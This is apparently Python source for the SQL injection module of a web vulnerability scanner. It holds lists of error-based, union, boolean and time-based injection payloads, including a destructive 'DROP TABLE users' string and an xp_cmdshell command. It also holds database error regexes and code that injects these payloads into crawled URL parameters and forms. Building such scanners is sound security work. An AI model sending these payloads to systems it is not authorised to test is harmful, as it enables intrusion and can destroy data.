import re
import time
from urllib.parse import urlparse, parse_qs, urlencode
from .utils import safe_request

class SQLScanner:
    def __init__(self):
        self.vulnerabilities = []

        # SQL Injection payloads
        self.error_payloads = [
            "'",
            "''",
            "`",
            "``",
            ",",
            '"',
            "\\",
            "1' OR '1'='1",
            "1' OR '1'='1'--",
            "1' OR '1'='1'/*",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR ('1'='1",
            "1; DROP TABLE users--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "admin'--",
            "admin'#",
            "' OR 'x'='x",
            "1 OR 1=1",
            "1' AND '1'='2",
            "' AND 1=1--",
            "' AND 1=2--",
        ]

        # Time-based blind SQLi payloads
        self.time_payloads = [
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SELECT SLEEP(5)--",
            "1; WAITFOR DELAY '0:0:5'--",
            "1 AND SLEEP(5)",
            "' AND SLEEP(5)--",
            "1' AND SLEEP(5)--",
            "'; exec master..xp_cmdshell('ping -n 5 127.0.0.1')--",
            "1 OR SLEEP(5)",
            "' OR SLEEP(5)--",
        ]

        # SQL error patterns
        self.error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your MySQL",
            r"MySqlException",
            r"ORA-[0-9]{4,5}",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_",
            r"Microsoft OLE DB Provider for SQL Server",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"SqlException",
            r"Unclosed quotation mark after the character string",
            r"Incorrect syntax near",
            r"mssql_query\(\)",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError:",
            r"org\.postgresql\.util\.PSQLException",
            r"ERROR:\s+syntax error at or near",
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_",
            r"Warning.*SQLite3::",
            r"\[SQLITE_ERROR\]",
            r"DB2 SQL error",
            r"db2_\w+\(",
            r"SQLSTATE",
            r"Sybase message",
            r"Warning.*sybase_",
            r"Sybase.*Server message",
        ]

    def scan(self, crawl_data, progress_callback=None):
        results = {
            'error_based': [],
            'time_based': [],
            'union_based': [],
            'boolean_based': [],
            'vulnerable_params': [],
            'vulnerable_forms': []
        }

        # Scan URL parameters
        for url, params in crawl_data.get('parameters', {}).items():
            if progress_callback:
                progress_callback(f"SQL scanning: {url}")

            param_vulns = self._scan_url_params(url, params)
            for vuln in param_vulns:
                results[vuln.get('subtype', 'error_based')].append(vuln)

        # Scan forms
        for form in crawl_data.get('forms', []):
            if progress_callback:
                progress_callback(f"SQL scanning form: {form['action']}")

            form_vulns = self._scan_form(form)
            results['vulnerable_forms'].extend(form_vulns)

        return results

    def _scan_url_params(self, url, params_string):
        vulnerabilities = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for param_name, param_values in params.items():
            # Error-based detection
            for payload in self.error_payloads[:15]:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param_name] = payload

                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
                response = safe_request(test_url)

                if response:
                    for pattern in self.error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vulnerabilities.append({
                                'type': 'SQL Injection',
                                'subtype': 'error_based',
                                'severity': 'CRITICAL',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'db_error': pattern,
                                'evidence': f"Database error pattern matched: {pattern}",
                                'description': f"Parameter '{param_name}' is vulnerable to SQL injection"
                            })
                            return vulnerabilities  # Found, stop testing this param

            # Time-based blind detection
            for payload in self.time_payloads[:5]:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param_name] = payload

                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"

                start_time = time.time()
                response = safe_request(test_url, timeout=15)
                elapsed = time.time() - start_time

                if elapsed >= 4.5:  # Significant delay
                    vulnerabilities.append({
                        'type': 'SQL Injection',
                        'subtype': 'time_based',
                        'severity': 'CRITICAL',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'response_time': elapsed,
                        'evidence': f"Response delayed by {elapsed:.2f}s",
                        'description': f"Parameter '{param_name}' vulnerable to time-based blind SQLi"
                    })
                    break

        return vulnerabilities

    def _scan_form(self, form):
        vulnerabilities = []

        for payload in self.error_payloads[:10]:
            form_data = {}

            for input_field in form['inputs']:
                if input_field['name']:
                    if input_field['type'] not in ['submit', 'button', 'image', 'reset', 'checkbox', 'radio']:
                        form_data[input_field['name']] = payload
                    else:
                        form_data[input_field['name']] = input_field['value'] or '1'

            if not form_data:
                continue

            response = safe_request(
                form['action'],
                method=form['method'],
                data=form_data
            )

            if response:
                for pattern in self.error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        vulnerabilities.append({
                            'type': 'SQL Injection in Form',
                            'severity': 'CRITICAL',
                            'url': form['action'],
                            'method': form['method'],
                            'payload': payload,
                            'db_error': pattern,
                            'evidence': f"Database error in form response",
                            'description': f"Form at {form['action']} vulnerable to SQL injection"
                        })
                        return vulnerabilities

        return vulnerabilities
